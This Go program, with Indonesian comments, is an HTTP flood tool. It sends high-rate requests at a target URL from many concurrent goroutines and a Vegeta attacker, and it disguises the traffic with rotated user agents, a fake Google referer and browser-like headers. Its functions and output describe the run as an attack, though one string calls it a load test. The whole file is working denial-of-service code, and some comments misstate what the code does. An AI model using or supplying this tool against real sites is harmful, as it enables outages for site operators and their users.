package main

import (
	"fmt"
	"math/rand"
	"os"
	"strconv"
	"sync"
	"sync/atomic"
	"time"

	"github.com/valyala/fasthttp"
	"github.com/tsenart/vegeta/v12/lib"
)

var (
	userAgents         []string
	successCount       uint64
	errorCount         uint64
	statusCodes        = make(map[int]uint64)
	mutex              sync.Mutex
	http1RequestCount  uint64 // Counter untuk request HTTP/1.1
	http2RequestCount  uint64 // Counter untuk request HTTP/2
	vegetaSuccessCount uint64 // Counter untuk request sukses Vegeta
	vegetaErrorCount   uint64 // Counter untuk request gagal Vegeta
)

func init() {
	rand.Seed(time.Now().UnixNano())
	userAgents = readLines("ua.txt")
}

func readLines(filename string) []string {
	content, err := os.ReadFile(filename)
	if err != nil {
		fmt.Printf("Error membaca file %s: %v\n", filename, err)
		os.Exit(1)
	}
	return splitLines(string(content))
}

func splitLines(data string) []string {
	lines := []string{}
	for _, line := range split(data, '\n') {
		lines = append(lines, line)
	}
	return lines
}

func split(s string, sep rune) []string {
	var res []string
	lastIndex := 0
	for i, c := range s {
		if c == sep {
			res = append(res, s[lastIndex:i])
			lastIndex = i + 1
		}
	}
	if lastIndex < len(s) {
		res = append(res, s[lastIndex:])
	}
	return res
}

func randomElement(elements []string) string {
	if len(elements) == 0 {
		return ""
	}
	return elements[rand.Intn(len(elements))]
}

func attackWithFastHTTP(targetURL string, duration time.Duration, rps int, wg *sync.WaitGroup) {
	defer wg.Done()

	clientHTTP1 := &fasthttp.Client{}
	clientHTTP2 := &fasthttp.Client{}
	clientHTTP2.MaxConnsPerHost = 1 // HTTP/2

	startTime := time.Now()
	interval := time.Second / time.Duration(rps)

	for time.Since(startTime) < duration {
		var client *fasthttp.Client
		if rand.Intn(10) < 5 { // 70% HTTP/2
			client = clientHTTP2
			atomic.AddUint64(&http2RequestCount, 1)
		} else {
			client = clientHTTP1
			atomic.AddUint64(&http1RequestCount, 1)
		}

		req := fasthttp.AcquireRequest()
		resp := fasthttp.AcquireResponse()

		req.SetRequestURI(targetURL)
			req.Header.Set("User-Agent", randomElement(userAgents))
			req.Header.Set("Referer", "https://www.google.com/")
			req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8")
			req.Header.Set("Accept-Language", "en-US,en;q=0.9")
			req.Header.Set("Accept-Encoding", "gzip, deflate, br")
			req.Header.Set("Connection", "keep-alive")
			req.Header.Set("Upgrade-Insecure-Requests", "1")
			req.Header.Set("Sec-Fetch-Dest", "document")
			req.Header.Set("Sec-Fetch-Mode", "navigate")
			req.Header.Set("Sec-Fetch-Site", "none")
			req.Header.Set("Sec-Fetch-User", "?1")
			req.Header.Set("Pragma", "no-cache")
			req.Header.Set("Cache-Control", "no-cache")

		err := client.Do(req, resp)
		if err != nil {
			atomic.AddUint64(&errorCount, 1)
		} else {
			atomic.AddUint64(&successCount, 1)
			statusCode := resp.StatusCode()
			mutex.Lock()
			statusCodes[statusCode]++
			mutex.Unlock()
		}

		fasthttp.ReleaseRequest(req)
		fasthttp.ReleaseResponse(resp)

		time.Sleep(interval)
	}
}

func attackWithVegeta(targetURL string, duration time.Duration, rps int, wg *sync.WaitGroup) {
	defer wg.Done()

	targeter := vegeta.NewStaticTargeter(vegeta.Target{
		Method: "GET",
		URL:    targetURL,
		Header: map[string][]string{
			"User-Agent": {randomElement(userAgents)},
			 "Referer": {"https://www.google.com"},
			 "Accept": {"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"},
			 "Accept-Language": {"en-US,en;q=0.9"},
			 "Accept-Encoding": {"gzip, deflate, br"},
			 "Connection": {"keep-alive"},
			 "Upgrade-Insecure-Requests": {"1"},
			 "Sec-Fetch-Dest": {"document"},
			 "Sec-Fetch-Mode": {"navigate"},
			 "Sec-Fetch-Site": {"none"},
			 "Sec-Fetch-User": {"?1"},
			 "Pragma": {"no-cache"},
			 "Cache-Control": {"no-cache"},
		},
	})

	attacker := vegeta.NewAttacker(vegeta.Workers(uint64(rps)), vegeta.KeepAlive(true))
	rate := vegeta.Rate{Freq: rps, Per: time.Second}
	res := attacker.Attack(targeter, rate, duration, "Vegeta Load Test")

	for r := range res {
		if r.Error != "" {
			atomic.AddUint64(&vegetaErrorCount, 1)
		} else {
			atomic.AddUint64(&vegetaSuccessCount, 1)
		}
	}
}

func main() {
	if len(os.Args) < 5 {
		fmt.Println("Usage: go run main.go <target> <duration> <threads> <rps>")
		fmt.Println("Contoh: go run main.go https://example.com 10 20 100")
		os.Exit(1)
	}

	target := os.Args[1]
	duration, _ := time.ParseDuration(os.Args[2])
	threads, _ := strconv.Atoi(os.Args[3])
	rps, _ := strconv.Atoi(os.Args[4])

	var wg sync.WaitGroup

	// Jalankan serangan dengan fasthttp
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go attackWithFastHTTP(target, duration, rps, &wg)
	}

	// Jalankan serangan dengan Vegeta
	wg.Add(1)
	go attackWithVegeta(target, duration, rps, &wg)

	wg.Wait()

	// Print hasil akhir
	fmt.Println("\n=== Hasil Serangan dengan fasthttp ===")
	fmt.Printf("Total request terkirim : %d\n", successCount+errorCount)
	fmt.Printf("Request sukses         : %d\n", successCount)
	fmt.Printf("Request gagal          : %d\n", errorCount)
	fmt.Printf("Request HTTP/1.1       : %d\n", http1RequestCount)
	fmt.Printf("Request HTTP/2         : %d\n", http2RequestCount)
	fmt.Println("\nStatus Code Diterima:")
	for code, count := range statusCodes {
		fmt.Printf("  %d : %d kali\n", code, count)
	}

	fmt.Println("\n=== Hasil Serangan dengan Vegeta ===")
	fmt.Printf("Total request terkirim : %d\n", vegetaSuccessCount+vegetaErrorCount)
	fmt.Printf("Request sukses         : %d\n", vegetaSuccessCount)
	fmt.Printf("Request gagal          : %d\n", vegetaErrorCount)
}